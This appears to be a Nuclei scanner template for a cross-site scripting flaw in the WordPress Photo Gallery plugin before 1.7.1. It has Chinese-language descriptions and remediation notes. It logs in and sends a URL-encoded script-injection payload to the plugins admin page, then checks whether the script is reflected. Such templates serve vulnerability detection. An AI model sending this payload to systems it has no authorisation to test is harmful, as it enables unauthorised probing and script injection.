id: photo-gallery-xss

info:
  name: Photo Gallery < 1.7.1 - 跨站脚本漏洞
  author: ritikchaddha
  severity: medium
  description: Photo Gallery < 1.7.1 - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  remediation: |
    - 对所有可控输入实施严格校验，并在输出到 HTML、JavaScript 或 URL 上下文前完成正确编码。
    - 如为后台或插件组件问题，建议同步更新到厂商已修复版本并审计相关功能入口。
  reference:
    - https://wpscan.com/vulnerability/e9f9bfb0-7cb8-4f92-b436-f08442a6c60a
    - https://wordpress.org/plugins/photo-gallery/advanced/
  classification:
    cpe: cpe:2.3:a:10web:photo_gallery:*:*:*:*:wordpress:*:*:*
    cwe-id: CWE-80
  metadata:
    verified: true
    max-request: 2
    vendor: 10web
    product: photo_gallery
    publicwww-query: "/wp-content/plugins/photo-gallery"
  tags: wpscan,wp,wp-plugin,wordpress,xss,photo-gallery,authenticated,vuln

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      - |
        GET /wp-admin/plugins.php?%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - '><script>alert(/XSS/)</script>'
          - 'Installed Plugins'
        condition: and

      - type: word
        part: header_2
        words:
          - text/html

      - type: status
        status:
          - 200
